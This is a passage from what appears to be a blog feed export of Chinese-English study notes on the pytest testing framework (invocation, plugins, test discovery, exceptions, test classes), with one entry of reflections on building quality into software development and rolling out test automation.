arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">pytest tests/test_mod.py::TestClass<br></code></pre></td></tr></table></figure><p>Specifying a specific test method: 指定具体的测试方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pytest tests/test_mod.py::TestClass::test_method<br></code></pre></td></tr></table></figure><p>Specifying a specific parametrization of a test: 指定测试的特定参数化：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pytest tests/test_mod<span class="hljs-selector-class">.py</span>::test_func<span class="hljs-selector-attr">[x1,y2]</span><br></code></pre></td></tr></table></figure><p><strong>Run tests by marker expressions：通过标记表达式运行测试</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pytest -m slow <br></code></pre></td></tr></table></figure><p>Will run all tests which are decorated with the <code>@pytest.mark.slow</code> decorator.</p><p>For more information see <a href="https://docs.pytest.org/en/8.0.x/how-to/mark.html#mark">marks</a>.</p><p>将运行所有用 @pytest.mark.slow 装饰器装饰的测试。 有关更多信息，请参阅标记（关于mark标记，后面会讲…）。</p><p><strong>Run tests from packages：从包运行测试</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">pytest <span class="hljs-comment">--pyargs pkg.testing</span><br></code></pre></td></tr></table></figure><p>This will import <code>pkg.testing</code> and use its filesystem location to find and run tests from.</p><p>这将导入 pkg.testing 并使用其文件系统位置来查找并运行测试。（这个用的少）</p><h2 id="2-2-获取有关版本、选项名称、环境变量的帮助"><a href="#2-2-获取有关版本、选项名称、环境变量的帮助" class="headerlink" title="2.2 获取有关版本、选项名称、环境变量的帮助"></a>2.2 获取有关版本、选项名称、环境变量的帮助</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pytest --version   <span class="hljs-comment"># shows where pytest was imported from 版本</span><br>pytest --fixtures  <span class="hljs-comment"># show available builtin function arguments显示可用的内置函数参数</span><br>pytest -h | --<span class="hljs-built_in">help</span> <span class="hljs-comment"># show help on command line and config file options显示帮助</span><br></code></pre></td></tr></table></figure><h2 id="2-3-分析测试执行持续时间"><a href="#2-3-分析测试执行持续时间" class="headerlink" title="2.3 分析测试执行持续时间"></a>2.3 分析测试执行持续时间</h2><p><em>6.0版本更改</em></p><p>To get a list of the slowest 10 test durations over 1.0s long要获取长度超过 1.0 秒的最慢 10 个测试持续时间的列表：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pytest <span class="hljs-attribute">--durations</span>=10 <span class="hljs-attribute">--durations-min</span>=1.0 # durations持续时间<br></code></pre></td></tr></table></figure><p>By default, pytest will not show test durations that are too small (&lt;0.005s) unless <code>-vv</code> is passed on the command-line.</p><p>默认情况下，pytest 不会显示太短（&lt;0.005s）的测试持续时间，除非在命令行上传递 -vv。</p><h2 id="2-4-管理插件的加载"><a href="#2-4-管理插件的加载" class="headerlink" title="2.4 管理插件的加载"></a>2.4 管理插件的加载</h2><h3 id="2-4-1-早期加载插件"><a href="#2-4-1-早期加载插件" class="headerlink" title="2.4.1 早期加载插件"></a>2.4.1 早期加载插件</h3><p>You can early-load plugins (internal and external) explicitly in the command-line with the <code>-p</code> option:</p><p>可以使用 -p 选项在命令行中显式提前加载插件（内部和外部）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pytest -<span class="hljs-selector-tag">p</span> mypluginmodule<br></code></pre></td></tr></table></figure><p>The option receives a <code>name</code> parameter, which can be:</p><p>该选项接收一个名称参数，该参数可以是：</p><ul><li><p>A full module dotted name, for example <code>myproject.plugins</code>. This dotted name must be importable.</p></li><li><p>完整的模块点名称，例如 myproject.plugins。这个点名称必须是可导入的。</p></li><li><p>The entry-point name of a plugin. This is the name passed to <code>setuptools</code> when the plugin is registered. For example to early-load the <a href="https://pypi.org/project/pytest-cov/">pytest-cov</a> plugin you can use:</p></li><li><p>插件的入口点名称。这是注册插件时传递给 setuptools 的名称。例如，要提前加载 pytest-cov 插件，您可以使用：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pytest -<span class="hljs-selector-tag">p</span> pytest_cov<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-4-2-禁用插件"><a href="#2-4-2-禁用插件" class="headerlink" title="2.4.2 禁用插件"></a>2.4.2 禁用插件</h3><p>To disable loading specific plugins at invocation time, use the <code>-p</code> option together with the prefix <code>no:</code>.</p><p>要禁止在调用时加载特定插件，请使用 -p 选项和前缀 no:。</p><p>示例：要禁用加载插件 doctest（该插件负责从文本文件执行 doctest 测试），请像这样调用 pytest：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pytest</span> -p <span class="hljs-literal">no</span>:doctest<br></code></pre></td></tr></table></figure><h2 id="2-5-调用-pytest-的其他方式"><a href="#2-5-调用-pytest-的其他方式" class="headerlink" title="2.5 调用 pytest 的其他方式"></a>2.5 调用 pytest 的其他方式</h2><h3 id="2-5-1-过-python-m-pytest-调用-pytest"><a href="#2-5-1-过-python-m-pytest-调用-pytest" class="headerlink" title="2.5.1 过 python -m pytest 调用 pytest"></a>2.5.1 过 python -m pytest 调用 pytest</h3><p>可以从命令行通过 Python 解释器调用测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m pytest<span class="hljs-meta"> [...]</span><br></code></pre></td></tr></table></figure><p>This is almost equivalent to invoking the command line script <code>pytest [...]</code> directly, except that calling via <code>python</code> will also add the current directory to <code>sys.path</code>.</p><p>这几乎相当于直接调用命令行脚本 pytest […]，只不过通过 python 调用还会将当前目录添加到 sys.path 中。</p><h3 id="2-5-2-从-Python-代码调用-pytest【常用】"><a href="#2-5-2-从-Python-代码调用-pytest【常用】" class="headerlink" title="2.5.2 从 Python 代码调用 pytest【常用】"></a>2.5.2 从 Python 代码调用 pytest【常用】</h3><p>可以直接从Python代码调用pytest：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">retcode</span> <span class="hljs-operator">=</span> pytest.main()<br></code></pre></td></tr></table></figure><p>this acts as if you would call “pytest” from the command line. It will not raise <a href="https://docs.python.org/3/library/exceptions.html#SystemExit"><code>SystemExit</code></a> but return the <a href="https://docs.pytest.org/en/8.0.x/reference/exit-codes.html#exit-codes">exit code</a> instead. If you don’t pass it any arguments, <code>main</code> reads the arguments from the command line arguments of the process (<a href="https://docs.python.org/3/library/sys.html#sys.argv"><code>sys.argv</code></a>), which may be undesirable. You can pass in options and arguments explicitly:</p><p>这就像从命令行调用“pytest”一样。它不会引发SystemExit，而是返回退出代码。如果不向它传递任何参数，则main将从进程的命令行参数(sys.argv)中读取参数，这可能是不希望看到的。你可以显式地传入选项和参数:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">retcode</span> = pytest.main([<span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;mytestdir&quot;</span>])<br></code></pre></td></tr></table></figure><p>您可以为<code> pytest.main</code> 指定其他插件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># content of myinvoke.py</span><br>import sys<br><br>import pytest<br><br><br>class MyPlugin:<br>    def pytest_sessionfinish(self):<br>        print(<span class="hljs-string">&quot;*** test run reporting finishing&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    sys.<span class="hljs-keyword">exit</span>(pytest.main([<span class="hljs-string">&quot;-qq&quot;</span>], plugins=[MyPlugin()]))<br></code></pre></td></tr></table></figure><p>Running it will show that <code>MyPlugin</code> was added and its hook was invoked:</p><p>运行它将显示 MyPlugin 已添加并且其钩子已被调用：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> python myinvoke.py<br><span class="hljs-comment">*** test run reporting finishing</span><br></code></pre></td></tr></table></figure><blockquote><p>Note</p><p>Calling <code>pytest.main()</code> will result in importing your tests and any modules that they import. Due to the caching mechanism of python’s import system, making subsequent calls to <code>pytest.main()</code> from the same process will not reflect changes to those files between the calls. For this reason, making multiple calls to <code>pytest.main()</code> from the same process (in order to re-run tests, for example) is not recommended.</p></blockquote><blockquote><p>注意<br>调用pytest.main()将导致导入测试和它们导入的任何模块。由于python导入系统的缓存机制，从同一进程对pytest.main()的后续调用将不会反映调用之间对这些文件的更改。出于这个原因，不建议从同一进程多次调用pytest.main()(例如，为了重新运行测试)。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【thought】思考之质量内建的一些理解</title>
    <link href="/2024/01/20/902%E6%80%9D%E8%80%83%E4%B9%8B%E8%B4%A8%E9%87%8F%E5%86%85%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <url>/2024/01/20/902%E6%80%9D%E8%80%83%E4%B9%8B%E8%B4%A8%E9%87%8F%E5%86%85%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="质量内建的理解"><a href="#质量内建的理解" class="headerlink" title="质量内建的理解"></a>质量内建的理解</h1><p><strong>质量的标准</strong>：</p><p>质量的标准是多维度的。可以是功能性的，也可以是体验方面的，或者以更低的成本交付、</p><p>测试的本质：是验证交付的产品符合产品设计的预期标准，以及是否存在可能影响产品质量或者用户体验的风险。软件工程的本质也是聚焦质量交付，为了在不断迭代的过程中解决质量不可控而产生的一系列方法论和最佳时间，</p><p>我们都知道一句话叫做：“质量是设计和构建出来的，而不是测试出来的。”</p><p>对于质量建设， 作用在软件的整个生命周期中，要求参与的各个角色实时对项目的质量负责，确保项目在交付到下一环节前已经有了基础的质量。质量内建的目的是为了减少因为前期风险不可控而导致后期的修复成本增加，进而浪费大量资源。</p><h2 id="影响质量的三要素："><a href="#影响质量的三要素：" class="headerlink" title="影响质量的三要素："></a>影响质量的三要素：</h2><p>1、范围是否明确：需求范围、影响范围、测试范围、交付范围</p><p>2、时间是否足够：科学合理评估投入的时间是否足够</p><p>3、成本是否可控：主要成本有软件成本和硬件成本，服务器资源、技术实现难度、新框架的落地和适配改造，投入人力和单位人力的产出效率</p><p>质量内建所面临的挑战：应对变化、质量文化、指导方法、工程能力</p><h2 id="质量内建落地四要素：组织-文化-方法-工具。"><a href="#质量内建落地四要素：组织-文化-方法-工具。" class="headerlink" title="质量内建落地四要素：组织+文化+方法+工具。"></a>质量内建落地四要素：组织+文化+方法+工具。</h2><p>1、组织：更合理的流程规范来尽可能的保证业务迭代和人员更迭</p><p>2、文化：文化的形成是长期持续的过程，既要宣讲也要实践</p><p>3、方法：在漫长的测试生涯有很多优秀的实践和方法可以参考，比如：测试左移、持续反馈、测试右移、质量跟踪等具体的时间方法，这些方法没有先后顺序，在落地的过程中要根据具体情况选择适合自己团队的方式，先小范围落地，拿到好的结果，形成影响力，然后再不断地扩大范围，由点到面最终形成体系化。</p><p>3、工具：上面提到了影响交付质量的三要素，其实时间和成本是相互影响的。但是两者之间有个共同的追求，就是效率，而各种工具或者平台的引入就是可以大幅提高研发过程的效率。比如CICD、监控平台、链路追踪、数据工厂、质量度量、自动化测试等工具平台，就是可以帮助质量内建更高效的落地</p><h2 id="质量内建的作用"><a href="#质量内建的作用" class="headerlink" title="质量内建的作用"></a>质量内建的作用</h2><p>就是在软件的整个生命周期中，要求参与的各个角色实时对软件的质量负责，确保软件在交付到下一环节钱已经有了基础的质量保证。目的是为了减少因为前期风险不可控而导致后期的修复成本增加，进而浪费大量资源。</p><p>与其说质量内建是一套方法论，我更认为其本质是一种思想和文化。通过全生命周期的全员对质量负责的理念，来指导实际的软件研发过程中关注质量，提高设计和构建质量，</p><h2 id="质量内建核心四点：全体负责、控制风险、关注和提高质量"><a href="#质量内建核心四点：全体负责、控制风险、关注和提高质量" class="headerlink" title="质量内建核心四点：全体负责、控制风险、关注和提高质量"></a>质量内建核心四点：全体负责、控制风险、关注和提高质量</h2><p>软件的整个生命周期如下</p><p>项目-&gt;计划-&gt;需求-&gt;设计-&gt;实现-&gt;测试-&gt;交付-&gt;再到计划迭代</p><p>1、全体负责：意味着参与项目的各个角色，如项目负责人、项目管理、产品、研发、测试运维等多个角色都对最终的线上产品交付质量负一定责任</p><p>2、控制风险：即在软件生命周期中的每个环节，都要利用质量门禁的作用尽早的介入需求设计、产品设计、技术方案设计等环节，通过评审、提问等方式，尽可能多的发现存在的漏洞和不足。然后通过制定科学合理符合项目实际情况的准入准出标准，来保证每个环节的流转到下一个环节的产出物达标</p><p>3、提高质量 ：  不用说，这个软件测试或者说质量保障工作一直以来的目标。</p><p>质量内建的八大特质：</p><p>持续评估</p><p>持续改进</p><p>持续验证</p><p>持续交付</p><p>持续巡检</p><p>持续度量</p><p>持续运营</p><p>持续反馈</p><p> 1、自身专业能力的持续提升与核心输出。 </p><p> 2、质量测试部门的管理及跨部门协同；</p><p> 3、质量测试全流程体系的梳理与建设；</p><p>您好，您指出的三个维度，是相辅相成且先后有序的，</p><p>自身40%—&gt;团队及跨部门30%—&gt;全流程体系建设30%</p><p>第一：自身专业能力的持续提升与核心输出是重中之重，这也是这个岗位的安身之根本所在，作为一个质量测试专业人员，持续提升自身业务能力是至关重要的。通过不断的学习和实践，对新的测试工具和框架的开发是可以明显提升测试效率且广泛应用在团队之上的，</p><p>第二：质量部门管理及跨部门协同：一个团队的战斗力远高于一个人之上， 团队的组建、人员的培养、资源管理、项目管理等维度可以通过技术文档编写、员工手册汇总、技术经验分享学习会等方式来提升整个质量团队综合能力，与开发、产品团队的协作等可以很好控制质量团队的准入准出标准，在项目的更早期可以以一个更低成本的方式去解决已经产生或可能产生的缺陷，减少因为前期风险不可控而导致后期的修复成本增加，进而浪费大量资源。</p><p>第三：质量测试全流程体系梳理与建设：始终坚信“质量是设计和构建出来的，而不是测试出来的”。质量内部的体系建设需要从组织+文化+方法+工具四个维度同时进行，以更合理的流程规范来经肯呢个的保证业务迭代和人员更迭从而影响组织，长期持续宣讲加实践形成从上而下的质量文化，通过测试左移、持续反馈、测试右移、质量跟踪等具体的实践方法落地到团队之中到哪到好的结果，形成影响力，再不断扩大范围由点到面最终形成体系化。通过各种工具或者平台的引入从而大幅提高研发过程的效率。如CICD、监控平台、链路追踪、数据工厂、质量度量、自动化测试等工具平台，帮助质量内建更高效落地。</p><p>基于以上三个维度做好质量内部建设体系，核心四要点：全体复杂、控制风险、关注质量、提高质量。</p><h1 id="如何把自动化在公司实施并推广起来？"><a href="#如何把自动化在公司实施并推广起来？" class="headerlink" title="如何把自动化在公司实施并推广起来？"></a><strong>如何把自动化在公司实施并推广起来？</strong></h1><p>分析：项了解自动化测试的实施和落地，考察你的参与度，是不是项目的主导人，你是负责整个项目还是一个简单的demo</p><p>1、工具选项，requests 、 selenium appium playwright 等，看下与项目匹配程度，</p><p>2、自动化测试框架的搭建—同时项目组内成员可以对用例补充</p><p>3、项目自动化实现，用起来</p><p>4、部署文档编写，使用手册编写</p><p>5、有成果后，将框架推广到其他项目组</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>thought</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>思考</tag>
      
      <tag>质量，摘抄</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之pytest使用指南快速入门(一)</title>
    <link href="/2024/01/20/661python%E4%B9%8Bpytest%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/"/>
    <url>/2024/01/20/661python%E4%B9%8Bpytest%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一-介绍"><a href="#一-介绍" class="headerlink" title="一 介绍"></a>一 介绍</h1><p>The pytest framework makes it easy to write small, readable tests, and can scale to support complex functional testing for applications and libraries.</p><p><code>pytest</code>框架可以轻松编写小型、可读的测试，并且可以扩展以支持应用程序和库的复杂功能测试。</p><p>结构简单、可伸缩、容易使用、测试具有表达性和可读性，</p><p>不需要样板代码，快速开始对应用程序或库进行小的单元测试或复杂的功能测试</p><h1 id="1-安装和入门"><a href="#1-安装和入门" class="headerlink" title="1 安装和入门"></a>1 安装和入门</h1><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><ol><li>在命令行中运行以下命令：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -U pytest<br></code></pre></td></tr></table></figure><ol start="2"><li>检查是否安装了正确的版本：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pytest --version</span><br>pytest 6.2.1<br></code></pre></td></tr></table></figure><h2 id="1-2-创建第一个测试"><a href="#1-2-创建第一个测试" class="headerlink" title="1.2 创建第一个测试"></a>1.2 创建第一个测试</h2><p>用四行代码创建一个简单的测试函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_sample.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_answer</span>():<br>    <span class="hljs-keyword">assert</span> func(<span class="hljs-number">3</span>) == <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>就是这样。现在可以执行测试功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">6.</span>x.y, py-<span class="hljs-number">1.</span>x.y, pluggy-<span class="hljs-number">0.</span>x.y<br>cachedir: $PYTHON_PREFIX/.pytest_cache<br>rootdir: $REGENDOC_TMPDIR<br>collected <span class="hljs-number">1</span> item<br><br>test_sample.py F                                                     [<span class="hljs-number">100</span>%]<br><br>================================= FAILURES =================================<br>_______________________________ test_answer ________________________________<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_answer</span>():<br>&gt;       <span class="hljs-keyword">assert</span> func(<span class="hljs-number">3</span>) == <span class="hljs-number">5</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">4</span> == <span class="hljs-number">5</span><br>E        +  where <span class="hljs-number">4</span> = func(<span class="hljs-number">3</span>)<br><br>test_sample.py:<span class="hljs-number">6</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_sample.py::test_answer - <span class="hljs-keyword">assert</span> <span class="hljs-number">4</span> == <span class="hljs-number">5</span><br>============================ <span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>这里的<code> [100%]</code>指的是运行所有测试用例的总体进度。完成后，pytest 会显示一个小小的失败报告，因为<code>func(3)</code>的返回值不是<code>5</code></p><h2 id="1-2-运行多个测试"><a href="#1-2-运行多个测试" class="headerlink" title="1.2 运行多个测试"></a>1.2 运行多个测试</h2><p><code>pytest</code> will run all files of the form test_*.py or *_test.py in the current directory and its subdirectories. More generally, it follows <a href="https://docs.pytest.org/en/8.0.x/explanation/goodpractices.html#test-discovery">standard test discovery rules</a>.</p><p>pytest 将运行当前目录及其子目录中 test_*.py 或 *_test.py 形式的所有文件。更一般地说，它遵循标准<code>测试发现规则</code>。</p><blockquote><p>Python测试发现的约定</p><p>Pytest实现了以下标准测试发现:</p><ul><li><p>如果没有指定参数，则从testpaths(如果配置了)或当前目录开始收集。或者，命令行参数可以在目录、文件名或节点id的任意组合中使用。</p></li><li><p>递归到目录中，除非它们匹配norecursedirs。</p></li><li><p>在这些目录中，搜索test_*.py或*_test.py文件，通过它们的测试包名导入。</p></li><li><p>从这些文件中，收集测试项目:</p><ul><li><p>在类之外添加Test前缀的测试函数或方法。</p></li><li><p>test前缀测试函数或方法在test前缀测试类中(不带__init__方法)。还考虑了用@staticmethod和@classmethods装饰的方法。</p></li></ul></li></ul><p>例如，如何自定义您的测试发现更改标准(Python)测试发现。</p><p>在Python模块中，pytest还使用标准unittest发现测试。TestCase子类化技术。</p></blockquote><h2 id="1-4-断言引发了某种异常"><a href="#1-4-断言引发了某种异常" class="headerlink" title="1.4 断言引发了某种异常"></a>1.4 断言引发了某种异常</h2><p>使用 raises 帮助器来断言某些代码引发异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_sysexit.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">raise</span> SystemExit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_mytest</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(SystemExit):<br>        f()<br></code></pre></td></tr></table></figure><p>还可以使用 raise 提供的上下文来断言预期异常是引发的 ExceptionGroup 的一部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_exceptiongroup.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">raise</span> ExceptionGroup(<br>        <span class="hljs-string">&quot;Group message&quot;</span>,<br>        [<br>            RuntimeError(),<br>        ],<br>    )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_exception_in_group</span>():<br>    <span class="hljs-keyword">with</span> pytest.raises(ExceptionGroup) <span class="hljs-keyword">as</span> excinfo:<br>        f()<br>    <span class="hljs-keyword">assert</span> excinfo.group_contains(RuntimeError)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> excinfo.group_contains(TypeError)<br></code></pre></td></tr></table></figure><p>Execute the test function with “quiet” reporting mode:</p><p>以“安静”报告模式执行测试功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q test_sysexit.py<br>.                                                                    [<span class="hljs-number">100</span>%]<br><span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><h2 id="1-5-将多个测试分组-封装-到一个类中"><a href="#1-5-将多个测试分组-封装-到一个类中" class="headerlink" title="1.5 将多个测试分组(封装)到一个类中"></a>1.5 将多个测试分组(封装)到一个类中</h2><p>定义了多个测试（def test_xxx() ），可能希望将它们分组到一个类中。 pytest 可以轻松创建包含多个测试的类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_class.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_one</span>(<span class="hljs-params">self</span>):<br>        x = <span class="hljs-string">&quot;this&quot;</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;h&quot;</span> <span class="hljs-keyword">in</span> x<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_two</span>(<span class="hljs-params">self</span>):<br>        x = <span class="hljs-string">&quot;hello&quot;</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">hasattr</span>(x, <span class="hljs-string">&quot;check&quot;</span>)<br></code></pre></td></tr></table></figure><p>pytest发现所有遵循Python<code>测试发现约定</code>的测试，因此它找到两个以test_为前缀的函数。不需要创建任何子类，但要确保为类添加Test前缀，否则将跳过该类。我们可以简单地通过传递它的文件名来运行模块:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q test_class.py<br>.F                                                                   [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>____________________________ TestClass.test_two ____________________________<br><br>self = &lt;test_class.TestClass <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0001</span>&gt;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_two</span>(<span class="hljs-params">self</span>):<br>        x = <span class="hljs-string">&quot;hello&quot;</span><br>&gt;       <span class="hljs-keyword">assert</span> <span class="hljs-built_in">hasattr</span>(x, <span class="hljs-string">&quot;check&quot;</span>)<br>E       AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br>E        +  where <span class="hljs-literal">False</span> = <span class="hljs-built_in">hasattr</span>(<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;check&#x27;</span>)<br><br>test_class.py:<span class="hljs-number">8</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_class.py::TestClass::test_two - AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br><span class="hljs-number">1</span> failed, <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>The first test passed and the second failed. You can easily see the intermediate values in the assertion to help you understand the reason for the failure.</p><p>第一次测试通过了，第二次测试失败了。可以轻松查看断言中的中间值(失败处)，以帮助了解失败的原因。</p><p>Grouping tests in classes can be beneficial for the following reasons:</p><blockquote><ul><li>Test organization</li><li>Sharing fixtures for tests only in that particular class</li><li>Applying marks at the class level and having them implicitly apply to all tests</li></ul></blockquote><p>将测试分组到班级中可能是有益的，原因如下：</p><ul><li>测试组织（这句话的意思是分类）</li><li>仅在该特定类中共享测试装置（单独应用fixture）</li><li>在类级别标记（pytest.mark）并将其隐式应用于所有测试</li></ul><p>Something to be aware of when grouping tests inside classes is that each test has a unique instance of the class.  Having each test share the same class instance would be very detrimental to test isolation and would promote poor test practices.  This is outlined below:</p><p>在类中对测试进行分组时需要注意的是，每个测试都有一个唯一的类实例。让每个测试共享相同的类实例将非常不利于测试隔离，并会促进糟糕的测试实践。这是概述如下:</p><p>（测试隔离：例如测试A类和B类都有自己的属性（或变量），避免两个测试类的属性串了，Tips ：尽量要写全局变量 ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 